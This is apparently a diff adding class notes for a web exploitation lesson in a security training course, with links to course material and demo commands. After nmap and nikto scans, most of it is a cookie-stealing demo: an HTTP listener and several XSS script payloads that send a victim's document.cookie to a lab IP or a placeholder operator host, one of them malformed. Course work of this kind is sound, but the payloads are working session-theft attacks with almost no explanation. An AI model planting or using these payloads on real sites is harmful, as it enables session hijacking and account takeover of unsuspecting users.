@@ -1,1 +1,15 @@
-
+----------------------------------------------------------------------------------------------------
+SECURITY DAY 2 MODULE LINKS AND INFO:
+  STUDENT FG: https://sec.cybbh.io/public/security/latest/lessons/lesson-4-xss_sg.html
+  STUDENT SLIDES: https://sec.cybbh.io/-/public/-/jobs/842473/artifacts/slides/04-web-exploitation.html
+----------------------------------------------------------------------------------------------------
+WEB EXPLOITATION DEMO:
+nmap --script http-enum.nse >IP< -p 80 
+nikto -host >IP<
+---
+SESSION COOKIE STEALING DEMO:
+python3 -m http.server (DEFAULTS TO 8000)
+ON WEB BROWSER: <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>
+<script>document.location="http://OP-Station-IP:OPS-PORT/?username=" + document.cookie;</script>
+<script>window.location.href="http://website/?"+document.cookie;</script>
+<script>write.location.href="http://10.50.20.97"</script>
